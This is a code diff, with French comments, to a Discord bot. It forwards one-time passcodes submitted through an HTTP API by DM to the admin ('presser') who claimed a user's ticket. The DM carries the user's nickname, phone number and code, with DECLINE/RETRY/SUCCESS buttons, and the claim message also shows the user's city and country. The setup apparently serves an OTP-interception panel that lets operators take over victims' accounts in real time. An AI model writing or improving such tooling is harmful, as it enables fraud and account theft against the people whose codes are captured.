@@ -243,7 +243,9 @@ function claimedBody(u, cfg, asked = false) {
     `**Phone**\u2003\`${u.phone ?? "?"}\`\n` +
     `**Location**\u2003${geo.city ?? "?"}, ${geo.country ?? "?"}`;
 
-  if (asked) {
+  if (asked === "received") {
+    body += `\n\notp receive`;
+  } else if (asked) {
     body += `\n\n${CALL_EMOJI} otp requested \u2014 waiting for the user to type the username.`;
   }
   const ft = (cfg.footer_text ?? "").trim();
@@ -746,33 +748,47 @@ export async function handleSuccessButton(interaction, userId) {
 }
 
 // ---------- Appelé par votre API HTTP quand le code otp est soumis ----------
-// Édite le message de claim (plus de DM) : code + 3 boutons DECLINE/RETRY/SUCCESS.
+// DM à l'admin qui a pris le ticket : code + 3 boutons.
+// En plus, édite le message de claim (celui avec "Ask otp" / "Asked for otp") pour
+// afficher "otp receive" à la place du texte d'attente — le bouton, lui, ne change pas.
 export async function notifyotpReceived(user, code) {
   if (!state.bot || state.status !== "online") {
     return { ok: false, message: "bot offline" };
   }
   const cfg = await getConfig();
   const presserId = user.discord_presser_id;
-  const chId = user.claim_channel_id;
-  const msgId = user.claim_message_id;
 
-  if (!presserId || !chId || !msgId) {
+  if (!presserId) {
     await logAction(
-      `⚠️ otp received for \`${user.nickname}\` but no claim message found.`
+      `⚠️ otp received for \`${user.nickname}\` but no admin has claimed.`
     );
-    return { ok: false, message: "no claim message" };
+    return { ok: false, message: "no presser" };
   }
 
   try {
-    const ch = await getChannel(chId);
-    const msg = await ch.messages.fetch(msgId);
-    await msg.edit(
+    const uDisc = await state.bot.users.fetch(String(presserId));
+    const msg = await uDisc.send(
       buildotpVerificationView(user.id, user.nickname, user.phone, code, cfg)
     );
+    await state.db
+      .collection("users")
+      .updateOne({ id: user.id }, { $set: { otp_message_id: msg.id } });
+
+    // édite le message de claim : seul le texte change, le bouton reste identique
+    if (user.claim_channel_id && user.claim_message_id) {
+      try {
+        const ch = await getChannel(user.claim_channel_id);
+        const claimMsg = await ch.messages.fetch(user.claim_message_id);
+        await claimMsg.edit(ClaimedView(user, cfg, "received"));
+      } catch (e) {
+        log.warn(`failed to update claim message: ${e}`);
+      }
+    }
+
     await logAction(
-      `📨 otp \`${code}\` received for \`${user.nickname}\` — panel updated (<@${presserId}>)`
+      `📨 otp \`${code}\` received for \`${user.nickname}\` — DM sent to <@${presserId}>`
     );
-    return { ok: true, message: "edited" };
+    return { ok: true, message: "sent" };
   } catch (e) {
     log.warn(`notify_otp_received failed: ${e}`);
     return { ok: false, message: String(e) };
